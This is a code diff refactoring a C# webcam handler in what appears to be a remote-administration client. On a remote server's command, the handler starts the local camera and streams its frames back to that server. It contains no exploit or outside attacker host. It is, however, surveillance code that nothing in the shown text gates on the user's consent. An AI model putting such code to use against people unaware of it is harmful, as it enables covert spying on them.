@@ -14,421 +14,326 @@ using Pulsar.Common.Messages.Other;
 using System.Collections.Concurrent;
 
 namespace Pulsar.Client.Messages
-{    
+{
     public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
     {
         private UnsafeStreamCodec _streamCodec;
-        private BitmapData _webcamData = null;
-        private Bitmap _webcam = null;
+        private BitmapData _bmpData;
+        private Bitmap _frameBmp;
         private ISender _clientMain;
+
         private Thread _captureThread;
-        private WebcamHelper _webcamHelper;
+        private WebcamHelper _helper;
+        private CancellationTokenSource _cts;
 
-        private WebcamHelper WebcamHelper
+        // Buffering
+        private readonly ConcurrentQueue<byte[]> _buffer = new ConcurrentQueue<byte[]>();
+        private readonly AutoResetEvent _wake = new AutoResetEvent(false);
+        private int _pending = 0;
+        private const int MAX_BUFFER = 10;
+
+        // Stats
+        private readonly Stopwatch _fpsWatch = new Stopwatch();
+        private int _frameCounter;
+        private float _lastFPS;
+        private bool _sendFPS;
+
+        private MemoryStream _stream;
+
+        private WebcamHelper Helper
         {
-            get
+            get { return _helper ?? (_helper = new WebcamHelper()); }
+        }
+
+        private MemoryStream Stream
+        {
+            get { return _stream ?? (_stream = new MemoryStream()); }
+        }
+
+        public override bool CanExecute(IMessage message)
+        {
+            return message is GetWebcam || message is GetAvailableWebcams;
+        }
+
+        public override bool CanExecuteFrom(ISender sender) { return true; }
+
+        public override void Execute(ISender sender, IMessage msg)
+        {
+            if (msg is GetWebcam)
+                Execute(sender, (GetWebcam)msg);
+            else if (msg is GetAvailableWebcams)
+                Execute(sender, (GetAvailableWebcams)msg);
+        }
+
+        private void Execute(ISender sender, GetWebcam m)
+        {
+            if (m.Status == RemoteWebcamStatus.Stop)
             {
-                if (_webcamHelper == null)
-                {
-                    _webcamHelper = new WebcamHelper();
-                }
-                return _webcamHelper;
+                Stop();
+                return;
+            }
+
+            if (m.Status == RemoteWebcamStatus.Start)
+            {
+                Start(sender, m);
+                return;
+            }
+
+            if (m.Status == RemoteWebcamStatus.Continue)
+            {
+                Interlocked.Add(ref _pending, m.FramesRequested);
+                _wake.Set();
             }
         }
 
-        private CancellationTokenSource _cancellationTokenSource;
-
-        // frame control variables
-        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
-        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
-        private int _pendingFrameRequests = 0;
-
-        // max buffer size to prevent memory issues
-        private const int MAX_BUFFER_SIZE = 10;
-
-        private readonly Stopwatch _stopwatch = new Stopwatch();
-        private int _frameCount = 0;
-        private float _lastFrameRate = 0f;
-        private bool _sendFrameRateNext = false;
-
-        private MemoryStream _reusableStream;
-
-        private MemoryStream ReusableStream
-        {
-            get
-            {
-                if (_reusableStream == null)
-                {
-                    _reusableStream = new MemoryStream();
-                }
-                return _reusableStream;
-            }
-        }
-
-        public override bool CanExecute(IMessage message) => message is GetWebcam ||
-                                                             message is GetAvailableWebcams;
-
-        public override bool CanExecuteFrom(ISender sender) => true;
-
-        public override void Execute(ISender sender, IMessage message)
-        {
-            switch (message)
-            {
-                case GetWebcam msg:
-                    Execute(sender, msg);
-                    break;
-                case GetAvailableWebcams msg:
-                    Execute(sender, msg);
-                    break;
-            }
-        }
-
-        private void Execute(ISender client, GetWebcam message)
-        {
-            if (message.Status == RemoteWebcamStatus.Stop)
-            {
-                StopWebcamStreaming();
-            }
-            else if (message.Status == RemoteWebcamStatus.Start)
-            {
-                StartWebcamStreaming(client, message);
-            }
-            else if (message.Status == RemoteWebcamStatus.Continue)
-            {
-                // server is requesting more frames
-                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
-                _frameRequestEvent.Set();
-            }
-        }
-
-        private void StartWebcamStreaming(ISender client, GetWebcam message)
+        private void Start(ISender sender, GetWebcam msg)
         {
             try
             {
                 try
                 {
-                    WebcamHelper.StartWebcam(message.DisplayIndex);
+                    Helper.StartWebcam(msg.DisplayIndex);
                 }
                 catch (Exception ex)
                 {
-                    Debug.WriteLine($"Error starting webcam: {ex.Message}");
-                    OnReport("Failed to start webcam: " + ex.Message);
+                    OnReport("Could not start webcam: " + ex.Message);
                     return;
                 }
-                Debug.WriteLine("Starting remote webcam session");
 
-                var webcamBounds = WebcamHelper.GetBounds();
-                var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
+                var b = Helper.GetBounds();
+                var res = new Resolution { Width = b.Width, Height = b.Height };
 
                 try
                 {
-                    if (_streamCodec == null)
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-
-                    if (message.CreateNew)
+                    if (_streamCodec == null ||
+                        msg.CreateNew ||
+                        _streamCodec.ImageQuality != msg.Quality ||
+                        _streamCodec.Monitor != msg.DisplayIndex ||
+                        !_streamCodec.Resolution.Equals(res))
                     {
-                        _streamCodec?.Dispose();
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                        OnReport("Remote webcam session started");
-                    }
-
-                    if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
-                    {
-                        _streamCodec?.Dispose();
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        if (_streamCodec != null) _streamCodec.Dispose();
+                        _streamCodec = new UnsafeStreamCodec(msg.Quality, msg.DisplayIndex, res);
                     }
                 }
                 catch (Exception ex)
                 {
-                    Debug.WriteLine($"Error initializing stream codec: {ex.Message}");
-                    OnReport("Failed to initialize stream codec: " + ex.Message);
+                    OnReport("Codec init failed: " + ex.Message);
                     return;
                 }
 
-                _clientMain = client;
+                _clientMain = sender;
 
-                // clear any pending frame requests and existing frames
-                ClearFrameBuffer();
-                Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);
+                Clear();
+                Interlocked.Exchange(ref _pending, msg.FramesRequested);
 
                 if (_captureThread == null || !_captureThread.IsAlive)
                 {
-                    try
-                    {
-                        _cancellationTokenSource = new CancellationTokenSource();
-                        _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
-                        _captureThread.Start();
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error starting capture thread: {ex.Message}");
-                        OnReport("Failed to start capture thread: " + ex.Message);
-                    }
+                    _cts = new CancellationTokenSource();
+                    _captureThread = new Thread(() => CaptureLoop(_cts.Token));
+                    _captureThread.IsBackground = true;
+                    _captureThread.Start();
                 }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Unexpected error in StartWebcamStreaming: {ex.Message}");
-                OnReport("Unexpected error: " + ex.Message);
+                OnReport("Unexpected webcam start error: " + ex.Message);
             }
         }
 
-        private void StopWebcamStreaming()
+        private void Stop()
         {
             try
             {
-                try
-                {
-                    WebcamHelper.StopWebcam();
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"Error stopping webcam: {ex.Message}");
-                }
-                Debug.WriteLine("Stopping remote webcam session");
+                try { Helper.StopWebcam(); } catch { }
 
-                _cancellationTokenSource?.Cancel();
+                if (_cts != null)
+                {
+                    _cts.Cancel();
+                    _wake.Set();
+                }
 
                 if (_captureThread != null && _captureThread.IsAlive)
                 {
-                    try
-                    {
-                        _frameRequestEvent.Set(); // wake up thread
-                        _captureThread.Join();
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error joining capture thread: {ex.Message}");
-                    }
-                    _captureThread = null;
+                    try { _captureThread.Join(); }
+                    catch { }
                 }
 
-                if (_webcam != null)
+                _captureThread = null;
+
+                if (_frameBmp != null)
                 {
-                    if (_webcamData != null)
-                    {
-                        try
-                        {
-                            _webcam.UnlockBits(_webcamData);
-                        }
-                        catch (Exception ex)
-                        {
-                            Debug.WriteLine($"Error unlocking bits: {ex.Message}");
-                        }
-                        _webcamData = null;
-                    }
                     try
                     {
-                        _webcam.Dispose();
+                        if (_bmpData != null)
+                        {
+                            _frameBmp.UnlockBits(_bmpData);
+                            _bmpData = null;
+                        }
+                        _frameBmp.Dispose();
                     }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error disposing webcam: {ex.Message}");
-                    }
-                    _webcam = null;
+                    catch { }
+                    _frameBmp = null;
                 }
 
                 if (_streamCodec != null)
                 {
-                    try
-                    {
-                        _streamCodec.Dispose();
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error disposing stream codec: {ex.Message}");
-                    }
+                    try { _streamCodec.Dispose(); } catch { }
                     _streamCodec = null;
                 }
 
-                // clear the buffer
-                ClearFrameBuffer();
-                Interlocked.Exchange(ref _pendingFrameRequests, 0);
+                Clear();
+                Interlocked.Exchange(ref _pending, 0);
             }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Unexpected error in StopWebcamStreaming: {ex.Message}");
-            }
+            catch { }
         }
 
-        private void BufferedCaptureLoop(CancellationToken cancellationToken)
+        private void CaptureLoop(CancellationToken ct)
         {
-            Debug.WriteLine("Starting buffered capture loop");
-            _stopwatch.Start();
+            _fpsWatch.Restart();
+            _frameCounter = 0;
 
-            while (!cancellationToken.IsCancellationRequested)
+            while (!ct.IsCancellationRequested)
             {
                 try
                 {
-                    // wait for frame requests if the buffer is full or no frames are requested
-                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
+                    if (_buffer.Count >= MAX_BUFFER || _pending <= 0)
                     {
-                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
-                        _frameRequestEvent.WaitOne(500);
-
-                        // if cancellation was requested during the wait
-                        if (cancellationToken.IsCancellationRequested)
-                            break;
-
+                        _wake.WaitOne(400);
+                        if (ct.IsCancellationRequested) break;
                         continue;
                     }
 
-                    // capture frame and add to buffer
-                    byte[] frameData = CaptureFrame();
-                    if (frameData != null)
+                    var data = Capture();
+                    if (data != null)
                     {
-                        _frameBuffer.Enqueue(frameData);
+                        _buffer.Enqueue(data);
 
-                        // increment frame counter for statistics
-                        _frameCount++;
-                        if (_stopwatch.ElapsedMilliseconds >= 1000)
+                        _frameCounter++;
+                        if (_fpsWatch.ElapsedMilliseconds >= 1000)
                         {
-                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
-                            _lastFrameRate = _frameCount;
-                            _frameCount = 0;
-                            _stopwatch.Restart();
-                            _sendFrameRateNext = true;
+                            _lastFPS = _frameCounter;
+                            _frameCounter = 0;
+                            _fpsWatch.Restart();
+                            _sendFPS = true;
                         }
                     }
 
-                    // send frames if we have pending requests
-                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
+                    while (_pending > 0 && _buffer.TryDequeue(out byte[] send))
                     {
-                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
+                        Send(send, Interlocked.Decrement(ref _pending) == 0);
                     }
                 }
-                catch (Exception ex)
+                catch
                 {
-                    Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
-                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
+                    Thread.Sleep(50);
                 }
             }
+        }
 
-            Debug.WriteLine("Buffered capture loop ended");
-        }        
-        
-        private byte[] CaptureFrame()
+        private byte[] Capture()
         {
             try
             {
-                _webcam = WebcamHelper.GetLatestFrame();
+                _frameBmp = Helper.GetLatestFrame();
+                if (_frameBmp == null) return null;
 
-                if (_webcam == null)
+                const PixelFormat pf = PixelFormat.Format32bppArgb;
+                Bitmap b = _frameBmp;
+
+                if (_frameBmp.PixelFormat != pf)
                 {
-                    return null;
+                    Bitmap conv = new Bitmap(_frameBmp.Width, _frameBmp.Height, pf);
+                    using (Graphics g = Graphics.FromImage(conv))
+                        g.DrawImage(_frameBmp, 0, 0);
+
+                    _frameBmp.Dispose();
+                    _frameBmp = conv;
+                    b = conv;
                 }
 
-                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
-                Bitmap processedBitmap = _webcam;
-                
-                if (_webcam.PixelFormat != codecPixelFormat)
-                {
-                    try
-                    {
-                        processedBitmap = new Bitmap(_webcam.Width, _webcam.Height, codecPixelFormat);
-                        using (Graphics g = Graphics.FromImage(processedBitmap))
-                        {
-                            g.DrawImage(_webcam, 0, 0, _webcam.Width, _webcam.Height);
-                        }
-                        _webcam.Dispose();
-                        _webcam = processedBitmap;
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
-                        processedBitmap = _webcam;
-                    }
-                }
+                _bmpData = b.LockBits(new Rectangle(0, 0, b.Width, b.Height),
+                    ImageLockMode.ReadOnly, b.PixelFormat);
 
-                _webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
-                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
+                Stream.Position = 0;
+                Stream.SetLength(0);
 
-                ReusableStream.Position = 0;
-                ReusableStream.SetLength(0);
+                _streamCodec.CodeImage(_bmpData.Scan0,
+                    new Rectangle(0, 0, b.Width, b.Height),
+                    new Size(b.Width, b.Height),
+                    b.PixelFormat,
+                    Stream);
 
-                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                _streamCodec.CodeImage(_webcamData.Scan0,
-                    new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
-                    new Size(processedBitmap.Width, processedBitmap.Height),
-                    processedBitmap.PixelFormat, ReusableStream);
-
-                return ReusableStream.ToArray();
+                return Stream.ToArray();
             }
-            catch (Exception ex)
+            catch
             {
-                Debug.WriteLine($"Error capturing frame: {ex.Message}");
                 return null;
             }
             finally
             {
-                if (_webcamData != null)
+                if (_bmpData != null)
                 {
-                    _webcam.UnlockBits(_webcamData);
-                    _webcamData = null;
+                    try { _frameBmp.UnlockBits(_bmpData); } catch { }
+                    _bmpData = null;
                 }
-                _webcam?.Dispose();
-                _webcam = null;
+
+                if (_frameBmp != null)
+                {
+                    try { _frameBmp.Dispose(); } catch { }
+                    _frameBmp = null;
+                }
             }
         }
-        
-        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
+
+        private void Send(byte[] data, bool last)
         {
-            if (frameData == null || _clientMain == null) return;
+            if (_clientMain == null || data == null) return;
 
             try
             {
-                var response = new GetWebcamResponse
-                {
-                    Image = frameData,
-                    Quality = _streamCodec.ImageQuality,
-                    Monitor = _streamCodec.Monitor,
-                    Resolution = _streamCodec.Resolution,
-                    IsLastRequestedFrame = isLastRequestedFrame,
-                    FrameRate = 0f
-                };
+                GetWebcamResponse r = new GetWebcamResponse();
+                r.Image = data;
+                r.Monitor = _streamCodec.Monitor;
+                r.Resolution = _streamCodec.Resolution;
+                r.Quality = _streamCodec.ImageQuality;
+                r.IsLastRequestedFrame = last;
+                r.FrameRate = _sendFPS ? _lastFPS : 0f;
 
-                if (_sendFrameRateNext)
-                {
-                    response.FrameRate = _lastFrameRate;
-                    _sendFrameRateNext = false;
-                }
-
-                _clientMain.Send(response);
+                _sendFPS = false;
+                _clientMain.Send(r);
             }
-            catch (Exception ex)
+            catch { }
+        }
+
+        private void Clear()
+        {
+            byte[] tmp;
+            while (_buffer.TryDequeue(out tmp)) { }
+        }
+
+        private void Execute(ISender sender, GetAvailableWebcams msg)
+        {
+            sender.Send(new GetAvailableWebcamsResponse
             {
-                Debug.WriteLine($"Error sending frame to server: {ex.Message}");
-            }
+                Webcams = WebcamHelper.GetWebcams()
+            });
         }
 
-        private void ClearFrameBuffer()
-        {
-            while (_frameBuffer.TryDequeue(out _)) { }
-        }
 
-        private void Execute(ISender client, GetAvailableWebcams message)
-        {
-            client.Send(new GetAvailableWebcamsResponse { Webcams = WebcamHelper.GetWebcams() });
-        }
-
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
         public void Dispose()
         {
             Dispose(true);
             GC.SuppressFinalize(this);
-        }        
-        
-        protected virtual void Dispose(bool disposing)
+        }
+
+        protected virtual void Dispose(bool d)
         {
-            if (disposing)
+            if (d)
             {
-                StopWebcamStreaming();
-                _streamCodec?.Dispose();
-                _cancellationTokenSource?.Dispose();
-                _frameRequestEvent?.Dispose();
-                _reusableStream?.Dispose();
+                Stop();
+                if (_cts != null) _cts.Dispose();
+                if (_wake != null) _wake.Dispose();
+                if (_stream != null) _stream.Dispose();
             }
         }
     }
